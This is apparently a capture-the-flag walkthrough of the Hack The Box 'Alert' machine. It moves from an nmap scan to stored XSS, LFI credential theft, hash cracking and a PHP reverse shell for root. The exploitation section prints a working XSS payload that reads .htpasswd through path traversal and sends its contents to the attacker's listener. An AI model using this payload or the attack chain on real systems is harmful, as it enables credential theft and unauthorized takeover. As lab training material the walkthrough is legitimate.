# Alert walkthrough

Tags: Stored XSS, LFI, JavaScript scripting, PHP reverse shell

## Connecting to Alert machine

Target IP address:      10.10.11.44
Target Domain:          alert.htb

Attacker IP address:    10.10.16.2

Command to connect:     `sudo openvpn /path/to/ovpn`

## Scanning and Enumeration

### Nmap scan

After the VPN connection is established and the machine is started, we can start scanning the target machine using `nmap`. The command used is:

`nmap --min-rate 3000 -p- -A 10.10.11.44`

The flags used are:

1. `--min-rate` : to specify the minimum rate of packets per second to send to the target machine
2. `-p-`        : to specify the scan should be performed on all ports
3. `-A`         : to enable OS detection and version detection

The results of the `nmap` scan is as below:

```bash
nmap --min-rate 3000 -p- -A 10.10.11.44
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-23 21:11 +08
Nmap scan report for 10.10.11.44
Host is up (0.020s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA)
|   256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA)
|_  256 cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519)
80/tcp    open     http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://alert.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
12227/tcp filtered unknown
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=12/23%OT=22%CT=1%CU=39556%PV=Y%DS=2%DC=T%G=Y%TM=676
OS:96187%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A
OS:)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M542ST11NW7%O2=M542
OS:ST11NW7%O3=M542NNT11NW7%O4=M542ST11NW7%O5=M542ST11NW7%O6=M542ST11)WIN(W1
OS:=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O
OS:=M542NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N
OS:)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=
OS:S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF
OS:=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=
OS:G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT      ADDRESS
1   65.75 ms 10.10.16.1
2   12.89 ms 10.10.11.44

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.24 seconds``
```

Based on the results above, the only open ports are port 22 (SSH) and port 80 (HTTP). Port 12227 is filtered so it shouldn't contain anything that might be useful for us right now.

Currently, the only port that interests us is port 80 and looking at the scan results, it seems that the domain of the target machine is `alert.htb`. So, we can now asssociate the target IP address (10.10.11.44) to this new-found domain in `/etc/hosts`.

Once that is done, we can just input `http://alert.htb` into the browser to visit the target website that is being served from the target's port 80.

### Visiting the website

Once we visit the website, we will be greeted with a page that allows us to upload a file , specifically an `.md` file. Aside from that, there is a **Contact Us** page that allows us to input any text, and an **About Us** page that doesn't do anything interesting for us. The main targets would be the main page where we can upload Markdown files and possibly the **Contact Us** page.

So, the first thing to try out right now is to upload a Markdown file and once the file is uploaded, it will parse the Markdown file and show us the contents, formatted correctly based on Markdown syntax. By intercepting the requests, we can modify the contents of the Markdown file we uploaded into JavaScript code and perform Cross-Site Scripting.

![XSS](./Screenshots/XSS%20possible.png)

![XSS 2](./Screenshots/XSS%20possible%20(website).png)

There is also a Share button at the bottom right corner of the page. If we click on the button, with the XSS script in the Markdown, the script will still be executed. This means that this is a Stored XSS attack where the script is stored on the server and will be executed whenever the page is loaded. This is a very useful if we can get this to be executed by an administrator or a root user.

## Exploitation

Since we now have an XSS vulnerability, we can try uploading the "Share" link through the **Contact Us** page. So first, we need to get a XSS payload that can transmit useful information. The payload will look something like this:

```javascript
<script>
fetch("http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd")
  .then(response => response.text())
  .then(data => {
    fetch("http://10.10.16.2:8888/?file_content=" + encodeURIComponent(data));
  });
</script>
```

By using this script, we can get the server to provide us with the contents of the `.htpasswd` file and to receive the contents we will need to first set up a listener. To do this, we can run `python3 -m http.server 8888` using the same port number in the payload above. Once this listener is setup, we can send the payload to the website via the **Contact Us** form.

Once the payload is sent, we can return to the listener and we should see some output.

![Listener output](./Screenshots/capturing%20credentials.png)

We can decode the output using any URL decoder tool, and we can extract only the useful information and save it to a file for further decrypting or brute forcing. The output will look something like this:

```hash
albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
```

Based on the output above, we can clearly identify the part of the hash that we need to crack. For this, I will be using `hashcat`. The command is as below:

```bash
hashcat -a 0 -m 1600 possible_credential.txt /path/to/wordlist
```

The password will be shown after a few minutes and we can use this to login to the target machine via SSH. The command is `ssh albert@alert.htb` and when prompted for the password, just paste the one cracked from hashcat. Once logged in, we can immediately retrieve the user flag by displaying the contents of user.txt in albert's home directory.

## Privilege Escalation

After obtaining the user flag, the next thing to look for is the root flag, which is normally stored as `root.txt` in `/root`. To do this, we need root privileges, which we currently don't have. So to find privilege escalation opportunities, we can start by getting `linpeas.sh` in. To do this, we can use `curl`.

Once `linpeas.sh.` is downloaded, we can add execute permissions to it and run it. The script will automatically scan for any potential vulnerabilities and report them to us. After running the script, we can see that there are several interesting paths as shown in the screenshot below:

![Interesting paths](./Screenshots/Intersting%20Files.png)

Looking into the directories highlighted in red, we can see that there are several PHP files and more directories.

![Directory of the interesting paths](./Screenshots/Directory%20of%20Interesting%20FIles.png)

And the `config` directory is actually editable by the `management` group, which `albert` is a part of. So we can go into this directory and write a reverse shell using PHP.

![Reverse Shell in PHP](./Screenshots/reverse%20shell%20using%20php.png)

However, even if we have this file, we still have no way of accessing or invoking this. So we need to go back to the output from linpeas and do further digging.

Looking at the **Active Ports** section in linpeas, we see that port 8080 is actually open and listening for connections. We can forward this port so that we can visit the page that is being hosted on the port from our local machine. To so this we need to run:

```bash
ssh -L 8888:localhost:8080 albert@alert.htb
```

and once that command is executed, we can go back to our local machine's browser and visit `localhost:8888` to view the site. From the website, we can see that it is actually related to the web-monitor directory that we had access and made changes to it earlier. Since we know the path to the reverse shell, we can just append it to the URL to invoke the PHP file. So the URL will look something like this, `http://localhost:8888/config/shell.php`. Once this is run, and assuming we already have a listener running, we will have a reverse connection to the victim machine. We can then use this to get a root shell and obtain the root flag.
